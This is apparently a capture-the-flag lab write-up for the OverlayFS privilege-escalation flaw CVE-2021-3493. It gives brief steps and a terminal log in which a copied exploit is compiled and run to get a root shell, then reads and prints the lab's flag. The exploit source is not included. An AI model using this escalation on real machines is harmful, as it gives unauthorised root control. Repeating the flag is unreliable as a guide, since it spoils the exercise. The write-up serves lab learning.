# OverlayFS - CVE-2021-3493
---
<b> 

> OverlayFS is a Linux kernel module that allows the system to combine several mount points into one, so that you can access all the files from each within one directory structure.

> It's often used by live USBs, or some other specialist applications. One use is having a read only root file system, and another partition "overlayed" with that to allow applications to write to a temporary file system.
</b>

<b>Target IP → 10.10.21.118</b>

#### Goal:
     We have to enter as SSH login.

OverlayFS is a Linux kernel module that allows the system to combine several mount points into one, so that you can access all the files from each within one directory structure.

It's often used by live USBs, or some other specialist applications. One use is having a read only root file system, and another partition "overlayed" with that to allow applications to write to a temporary file system.

Target IP → 10.10.21.118

We have to enter as SSH login.


Now I am in…

1. Now we have to copy the exploit from another website where we have the details of OverlayFS.
2. We will copy that file into `exploit.c` file as it is a C file then we will run the compiler.
3. Then it will create an exploit auto root file and we have to run that `./root`.

# Commands
```sh

Last login: Mon Jul  1 10:10:48 2024 from 10.100.2.141
overlay@overlayfs:~$ ls
overlay@overlayfs:~$ pwd
/home/overlay
overlay@overlayfs:~$ 
overlay@overlayfs:~$ nano exploit.c
overlay@overlayfs:~$ gcc -o exploit exploit.c
overlay@overlayfs:~$ ls
exploit  exploit.c
overlay@overlayfs:~$ ./exploit 
bash-4.4# ls
exploit  exploit.c  ovlcap
bash-4.4# whoami
root
bash-4.4# cat ov`
> ^C
bash-4.4# cat ovlcap/
cat: ovlcap/: Is a directory
bash-4.4# cd ovlcap/
bash-4.4# ls
lower  merge  upper  work
bash-4.4# cd lower/
bash-4.4# ls
bash-4.4# cd ..
bash-4.4# cd merge/
bash-4.4# ls
bash-4.4# cd ..
bash-4.4# cd ..
bash-4.4# ls
exploit  exploit.c  ovlcap
bash-4.4# cd /mnt/root
bash: cd: /mnt/root: No such file or directory
bash-4.4# lscd /mnt/root/
bash: lscd: command not found
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),1001(overlay)
bash-4.4# cd  /root/
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt 
thm{27aaa5865a52dcd4cb04c0e0a2d39404}
bash-4.4# 
```
